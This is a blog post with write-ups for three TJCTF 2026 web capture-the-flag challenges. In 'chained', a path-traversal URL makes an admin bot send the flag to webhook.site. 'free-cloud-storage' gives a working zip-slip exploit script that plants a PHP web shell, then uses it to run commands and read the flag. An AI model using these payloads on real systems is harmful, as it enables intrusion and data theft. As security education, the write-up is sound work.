@@ -1,0 +1,466 @@
+---
+layout: post
+title:  "Web Challenges"
+date:   2026-05-17 20:54:00 -0400
+author: robo.uzi
+tags: [CTF]
+permalink: /TJCTF-2026-web/
+---
+* TOC
+{:toc}
+
+## chained
+
+**Author**: grace
+
+**Category**: web
+
+**Description**: i designed my own admin bot! and i included an admin page that should be super duper secure... running on port 5000 `https://chained.tjc.tf`, `https://admin-bot.tjctf.org/chained`
+
+I get the challenge files. `index.html`:
+```html
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="Content-Security-Policy" content= "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'none'; object-src 'none';  manifest-src 'none'; ">
+        <link rel="stylesheet" href="static/style.css">
+        <title>Chained</title>
+    </head>
+    
+    <body>
+        <h1>Chained Admin Bot</h1>
+        <p>I designed an admin bot project that'll send a request to your website! I included a blacklist for URLs, so hopefully my sanitization is completely airtight...</p>
+        <p>{{ desc }}</p>
+        <form action="/" method="POST">
+            <input type="url" name="url" placeholder="Input a URL here">
+            <button type="submit">Submit</button>
+        </form>
+        <h3> {{ q | safe }} </h3>
+    </body>
+</html>
+```
+
+`app.py`:
+```python
+from flask import Flask, request, render_template, redirect, url_for
+import requests
+
+app = Flask(__name__)
+
+def isSafe(url):
+    blacklist={'127', 'local', '2130706433', '017700000001', '::1', '0.0.0.0', '[::]', 'ffff', '0.0.0.0', '0x', '..', '%2e%2e', '@'}
+    return all([i not in url.lower() for i in blacklist])
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        url = request.form['url'] or ''
+        if not isSafe(url): return 'Access denied. URL parameter included one or more of the blacklisted keywords.'
+        return redirect(url_for('index', url=url))
+    url = request.args.get('url') or ''
+    if url: 
+        desc = 'The admin will visit your URL.'
+        try: req = 'Your response: ' + requests.get(url).text
+        except: return 'Uh-oh... Try again!'
+    else: req, desc = '', ''
+    return render_template('index.html', q = req, desc=desc)
+
+@app.route('/admin')
+def js():
+    if request.remote_addr != '127.0.0.1': return 'Access denied. Page only accessible from server side.'
+    query = request.args.get("q", "")
+    return query, 200, {'Content-Type': 'application/javascript'}
+
+if __name__ == '__main__':
+    app.run()
+```
+
+`admin-bot.js`:
+```javascript
+import flag from './flag.txt';
+
+function sleep(time) {
+    return new Promise(resolve => {
+        setTimeout(resolve, time)
+    });
+}
+
+export default {
+    id: 'chained',
+    name: 'chained',
+    urlRegex: /^https:\/\/chained\.tjc\.tf\/admin\//,
+    timeout: 10000,
+    handler: async (url, ctx) => {
+        const page = await ctx.newPage();
+        await page.goto(url + flag, { timeout: 3000, waitUntil: 'domcontentloaded' });
+        await sleep(5000);
+    }
+};
+```
+
+The admin bot requires the URL to start with `https://chained.tjc.tf/admin/`. I submit this link to the admin bot the get the flag:
+```shell
+https://chained.tjc.tf/admin/../?url=https://webhook.site/ID/FLAG
+```
+
+Using path traversal, you can reach the index route and trigger the SSRF. Back on `webhook.site` I get the flag:
+```shell
+https://webhook.site/ID/FLAGtjctf%7Bch41n3d_o340e934l35d%7D
+```
+
+`tjctf{ch41n3d_o340e934l35d}`
+
+___
+
+## treasure-hunt
+
+**Author**: elliott
+
+**Category**: web
+
+**Description**: Let's go hunt down some treasure! The flag is split into 4 parts. I'll give you the first one right here: tjctf `https://treasure-hunt.tjc.tf`
+
+First I look at `robots.txt`:
+```shell
+curl https://treasure-hunt.tjc.tf/robots.txt  
+User-agent: *  
+Disallow: /gold-coffer  
+Allow: /
+```
+
+`/gold-coffer` has the 4th part of the flag:
+```shell
+curl https://treasure-hunt.tjc.tf/gold-coffer  
+g0ld}
+```
+
+The 3rd part of the flag is hidden on the page:
+```shell
+curl https://treasure-hunt.tjc.tf/  
+<!DOCTYPE html>  
+<html lang="en">  
+  
+<head>  
+	<meta charset="UTF-8">  
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">  
+	<link rel="stylesheet" href="/static/styles.css">  
+	<title>Pirates!</title>  
+</head>  
+  
+<body>  
+	<h1>Learn about pirates!</h1>  
+	<h2>Wow!</h2>  
+	<form method="POST">  
+		<input type="submit" value="Learn More">  
+	</form>  
+	<img src="/static/ship.png" alt="ship">  
+	<p hidden>_and_</p>  
+</body>  
+</html>
+```
+
+Part 2 of the flag is a cookie that gets set when I click `Learn More` which takes you to `/extra_info`:
+```shell
+curl -i -X POST https://treasure-hunt.tjc.tf/ 
+HTTP/2 302  
+content-type: text/html; charset=utf-8  
+date: Fri, 15 May 2026 17:28:23 GMT  
+location: /extra_info  
+server: gunicorn  
+set-cookie: silver_coffer={s1lv3r; Path=/  
+content-length: 209  
+  
+<!doctype html>  
+<html lang=en>  
+<title>Redirecting...</title>  
+<h1>Redirecting...</h1>  
+<p>You should be redirected automatically to the target URL: <a href="/extra_info">/extra_info</a>. If not, click the link.
+```
+
+`tjctf{s1lv3r_and_g0ld}`
+
+___
+
+## free-cloud-storage
+
+**Author**: samuel
+
+**Category**: web
+
+**Description**: Free cloud storage, what could possibly go wrong?
+
+I download the challenge files:
+```shell
+unzip chall.zip  
+Archive:  chall.zip  
+  inflating: flag.php  
+  inflating: upload.php  
+  inflating: index.html  
+  inflating: composer.json
+```
+
+`composer.json`:
+```json
+{
+  "name": "free-cloud-storage/zip-upload",
+  "require": {
+    "chumper/zipper": "1.0.2"
+  }
+}
+```
+
+`index.html`:
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Free Cloud Storage</title>
+</head>
+<body>
+    <h1>Free Cloud Storage</h1>
+    <div class="container">
+        <p>Our 100% legit cloud storage service provides all the space you need for your needs!</p>
+        <form action="upload.php" method="post" enctype="multipart/form-data">
+            <input type="file" name="zipfile" accept=".zip" required>
+            <button type="submit">Upload</button>
+        </form>
+    </div>
+</body>
+</html>
+```
+
+`upload.php`:
+```php
+<?php
+require 'vendor/autoload.php';
+
+use Chumper\Zipper\Zipper;
+
+$uploadDir = __DIR__ . '/uploads/';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+
+    if (!isset($_FILES['zipfile'])) {
+        die("No file uploaded.");
+    }
+
+    $tmpName = $_FILES['zipfile']['tmp_name'];
+    $fileName = basename($_FILES['zipfile']['name']);
+
+    if (pathinfo($fileName, PATHINFO_EXTENSION) !== 'zip') {
+        die("Only zip files allowed.");
+    }
+
+    $destination = $uploadDir . $fileName;
+
+    if (!move_uploaded_file($tmpName, $destination)) {
+        die("Upload failed.");
+    }
+
+    echo "<p>File uploaded. Extracting...</p>";
+
+    $zipper = new Zipper(); 
+
+    $zipper->make($destination)->extractTo($uploadDir);
+
+    echo "<p>Extraction complete!</p>";
+}
+?>
+
+<!DOCTYPE html>
+<html>
+<body>
+<h2>Upload your ZIP file</h2>
+<form method="POST" enctype="multipart/form-data">
+    <input type="file" name="zipfile" required>
+    <button type="submit">Upload</button>
+</form>
+</body>
+</html>
+```
+
+`flag.php`:
+```php
+<?php
+
+die("Nice try, but there's no flag here!");
+
+?>
+```
+
+On [https://github.com/snyk/zip-slip-vulnerability](https://github.com/snyk/zip-slip-vulnerability) I find that [chumper/zipper](https://github.com/Chumper/Zipper) `1.0.2` is vulnerable to the zip slip vulnerability. 
+
+On [https://github.com/Chumper/Zipper/releases/tag/v1.0.3](https://github.com/Chumper/Zipper/releases/tag/v1.0.3) I can see they patched it:
+```shell
+unzip Zipper-1.0.3.zip  
+Archive:  Zipper-1.0.3.zip  
+d15207e010f8fe1bdd341376bd86d599c4166423  
+   creating: Zipper-1.0.3/  
+  inflating: Zipper-1.0.3/LICENSE  
+  inflating: Zipper-1.0.3/README.md  
+  inflating: Zipper-1.0.3/composer.json  
+   creating: Zipper-1.0.3/src/  
+   creating: Zipper-1.0.3/src/Chumper/  
+   creating: Zipper-1.0.3/src/Chumper/Zipper/  
+   creating: Zipper-1.0.3/src/Chumper/Zipper/Facades/  
+  inflating: Zipper-1.0.3/src/Chumper/Zipper/Facades/Zipper.php  
+   creating: Zipper-1.0.3/src/Chumper/Zipper/Repositories/  
+  inflating: Zipper-1.0.3/src/Chumper/Zipper/Repositories/RepositoryInterface.php  
+  inflating: Zipper-1.0.3/src/Chumper/Zipper/Repositories/ZipRepository.php  
+  inflating: Zipper-1.0.3/src/Chumper/Zipper/Zipper.php  
+  inflating: Zipper-1.0.3/src/Chumper/Zipper/ZipperServiceProvider.php
+
+cat src/Chumper/Zipper/Zipper.php | grep -C 15 traversal  
+				$self->extractOneFileInternal($fileName, $path);  
+			}  
+		});  
+	}  
+  
+	/**  
+	 * @param $fileName  
+	 * @param $path  
+	 *  
+	 * @throws \RuntimeException  
+	 */  
+	private function extractOneFileInternal($fileName, $path)  
+	{  
+		$tmpPath = str_replace($this->getInternalPath(), '', $fileName);  
+  
+		//Prevent Zip traversal attacks  
+		if (strpos($fileName, '../') !== false || strpos($fileName, '..\\') !== false) {  
+			throw new \RuntimeException('Special characters found within filenames');  
+		}  
+  
+		// We need to create the directory first in case it doesn't exist  
+		$dir = pathinfo($path.DIRECTORY_SEPARATOR.$tmpPath, PATHINFO_DIRNAME);  
+		if (!$this->file->exists($dir) && !$this->file->makeDirectory($dir, 0755, true, true)) {  
+			throw new \RuntimeException('Failed to create folders');  
+		}  
+  
+		$toPath = $path.DIRECTORY_SEPARATOR.$tmpPath;  
+		$fileStream = $this->getRepository()->getFileStream($fileName);  
+		$this->getFileHandler()->put($toPath, $fileStream);  
+	}  
+}
+```
+
+They added these lines:
+```php
+//Prevent Zip traversal attacks|
+if (strpos($fileName, '../') !== false \| strpos($fileName, '..\\') !== false) {
+	throw new \RuntimeException('Special characters found within filenames');
+}
+```
+
+What the code looked like before the `1.0.3` patch (and what the site is running now):
+```shell
+unzip Zipper-1.0.2.zip  
+Archive:  Zipper-1.0.2.zip  
+6a1733c34d67c3952b8439afb36ad4ea5c3ceacb  
+   creating: Zipper-1.0.2/  
+  inflating: Zipper-1.0.2/.gitignore  
+  inflating: Zipper-1.0.2/.php_cs  
+  inflating: Zipper-1.0.2/.php_cs.cache  
+  inflating: Zipper-1.0.2/.travis.yml  
+  inflating: Zipper-1.0.2/LICENSE  
+  inflating: Zipper-1.0.2/README.md  
+  inflating: Zipper-1.0.2/composer.json  
+  inflating: Zipper-1.0.2/phpunit.xml  
+   creating: Zipper-1.0.2/src/  
+   creating: Zipper-1.0.2/src/Chumper/  
+   creating: Zipper-1.0.2/src/Chumper/Zipper/  
+   creating: Zipper-1.0.2/src/Chumper/Zipper/Facades/  
+  inflating: Zipper-1.0.2/src/Chumper/Zipper/Facades/Zipper.php  
+   creating: Zipper-1.0.2/src/Chumper/Zipper/Repositories/  
+  inflating: Zipper-1.0.2/src/Chumper/Zipper/Repositories/RepositoryInterface.php  
+  inflating: Zipper-1.0.2/src/Chumper/Zipper/Repositories/ZipRepository.php  
+  inflating: Zipper-1.0.2/src/Chumper/Zipper/Zipper.php  
+  inflating: Zipper-1.0.2/src/Chumper/Zipper/ZipperServiceProvider.php  
+   creating: Zipper-1.0.2/tests/  
+  inflating: Zipper-1.0.2/tests/ArrayArchive.php  
+   creating: Zipper-1.0.2/tests/Repositories/  
+  inflating: Zipper-1.0.2/tests/Repositories/ZipRepositoryTest.php  
+  inflating: Zipper-1.0.2/tests/ZipperTest.php
+  
+cat src/Chumper/Zipper/Zipper.php | grep -C 15 "private function extractOneFileInternal"  
+			}  
+  
+			$filename = str_replace($self->getInternalPath(), '', $fileName);  
+			if ($matchingMethod($filename)) {  
+				$self->extractOneFileInternal($fileName, $path);  
+			}  
+		});  
+	}  
+  
+	/**  
+	 * @param $fileName  
+	 * @param $path  
+	 *  
+	 * @throws \RuntimeException  
+	 */  
+	private function extractOneFileInternal($fileName, $path)  
+	{  
+		$tmpPath = str_replace($this->getInternalPath(), '', $fileName);  
+  
+		// We need to create the directory first in case it doesn't exist  
+		$dir = pathinfo($path.DIRECTORY_SEPARATOR.$tmpPath, PATHINFO_DIRNAME);  
+		if (!$this->file->exists($dir) && !$this->file->makeDirectory($dir, 0755, true, true)) {  
+			throw new \RuntimeException('Failed to create folders');  
+		}  
+  
+		$toPath = $path.DIRECTORY_SEPARATOR.$tmpPath;  
+		$fileStream = $this->getRepository()->getFileStream($fileName);  
+		$this->getFileHandler()->put($toPath, $fileStream);  
+	}  
+}
+```
+
+Its easier to read the code when you diff the versions on github at: [https://github.com/Chumper/Zipper/compare/v1.0.2...v1.0.3](https://github.com/Chumper/Zipper/compare/v1.0.2...v1.0.3)
+
+I start an instance at `https://free-cloud-storage-44daf895122d8055.tjc.tf`
+
+I run this python to generate a malicious zip file:
+```python
+import zipfile
+
+shell_code = """<?php
+if (isset($_REQUEST['cmd'])) {
+    system($_REQUEST['cmd']);
+}
+?>"""
+
+with zipfile.ZipFile('exploit.zip', 'w') as zf:
+    # write to the web server root directory
+    zf.writestr('../../../../var/www/html/shell.php', shell_code)
+```
+
+I upload the file to the site and confirm RCE with my webshell:
+```shell
+curl https://free-cloud-storage-44daf895122d8055.tjc.tf/shell.php?cmd=id  
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Get the flag:
+```shell
+curl https://free-cloud-storage-44daf895122d8055.tjc.tf/shell.php?cmd=ls  
+Dockerfile  
+composer.json  
+composer.lock  
+flag.php  
+flag.txt  
+index.html  
+shell.php  
+upload.php  
+uploads  
+vendor  
+```
+
+```shell
+curl https://free-cloud-storage-44daf895122d8055.tjc.tf/shell.php?cmd=cat%20flag.txt  
+tjctf{i_l0v3_fr33_st0r4g3}
+```
+
+`tjctf{i_l0v3_fr33_st0r4g3}`
